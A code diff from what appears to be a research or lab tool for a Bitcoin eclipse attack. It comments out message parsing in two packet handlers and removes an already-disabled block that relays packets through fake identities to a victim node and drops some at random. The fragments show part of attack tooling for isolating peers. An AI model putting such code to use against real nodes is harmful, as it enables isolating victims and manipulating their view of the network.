@@ -285,7 +285,7 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 	if not payload_length_valid: return False
 
 	# Parse the message payload
-	msg = MsgSerializable.from_bytes(msg_raw)
+	#msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')
@@ -339,7 +339,7 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 	if not payload_length_valid: return False
 
 	# Parse the message payload
-	msg = MsgSerializable.from_bytes(msg_raw)
+	#msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
@@ -358,40 +358,6 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 		socket.close()
 		return True # End the thread
 
-	""" Relaying code
-	elif packet[IP].dst == attacker_ip:
-		if len(identity_socket) > 0:
-			if random.random() > eclipse_packet_drop_rate:
-				rand_i = random.randint(0, len(identity_socket) - 1)
-				rand_ip = identity_address[rand_i][0]
-				rand_port = identity_address[rand_i][1]
-				rand_socket = identity_socket[rand_i]
-
-				print(f'*** Relaying {msg_type} from {packet[IP].src} to {rand_ip}:{rand_port}')
-				#packet[IP].src = rand_ip
-				#packet[IP].dst = victim_ip
-
-				try:
-					#custom = custom_packet(msg_type, rand_ip, victim_ip, rand_port, victim_port)
-					#if custom is not None:
-					#	rand_socket.send(custom.to_bytes())
-
-					#ip = IP(dst = victim_ip)
-					#tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
-					#new_packet = ip/tcp/packet[TCP].payload
-					#rand_socket.send(bytes(new_packet))
-
-					payload = packet[TCP].payload
-					rand_socket.send(bytes(payload))
-
-				except Exception as e:
-					print("Closing socket because of error: " + str(e))
-					close_connection(rand_i)
-					time.sleep(5)
-					make_fake_connection(rand_ip, victim_ip, False) # Use old IP
-					#make_fake_connection(random_ip(), victim_ip)
-					sys.exit() # Stop the current thread that sniffs for packets on this interface
-	"""
 	return False
 
 # Initialize the network
